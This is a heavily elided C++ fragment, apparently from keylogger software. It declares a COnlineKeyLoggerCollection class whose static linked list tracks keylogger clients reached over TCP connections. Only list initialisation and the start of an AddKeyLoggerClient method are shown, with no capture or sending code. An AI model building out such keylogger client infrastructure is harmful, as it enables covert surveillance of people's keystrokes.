...
class COnlineKeyLoggerCollection
{
	...
	protected:
		...
		static CExtendedLinkedList<void> *m_lnkdlstKeyLoggerClients;
...
CExtendedLinkedList<void> *COnlineKeyLoggerCollection::m_lnkdlstKeyLoggerClients=0; 
...
{
	CExtendedLinkedList<void> *TmpList=new CExtendedLinkedList<void>();
...
bool COnlineKeyLoggerCollection::AddKeyLoggerClient(CTcpNwMonitorConnection TcpConnection)
{
	...
	if(!m_lnkdlstKeyLoggerClients) m_lnkdlstKeyLoggerClients=new CExtendedLinkedList<void>(); 
